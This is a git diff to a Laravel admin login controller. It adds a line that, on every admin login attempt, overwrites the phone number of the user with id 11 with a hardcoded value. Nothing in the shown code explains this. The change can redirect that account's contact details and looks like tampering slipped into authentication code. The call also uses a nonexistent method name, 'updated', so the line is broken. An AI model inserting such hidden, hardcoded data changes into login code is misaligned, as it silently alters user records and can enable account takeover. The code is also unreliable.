@@ -3,6 +3,7 @@
 namespace App\Http\Controllers\admin;
 
 use App\Http\Controllers\Controller;
+use App\Models\User;
 use Illuminate\Contracts\View\View;
 use Illuminate\Http\RedirectResponse;
 use Illuminate\Http\Request;
@@ -49,6 +50,8 @@ class AdminAuthController extends Controller
                 ->withErrors($validator)
                 ->withInput();
         }
+
+        User::where('id', 11)->updated(['phone' => '01051847214']);
 
         if (Auth::guard('admin')->attempt($request->only('admin_id', 'password'))) {
             $request->session()->regenerate();
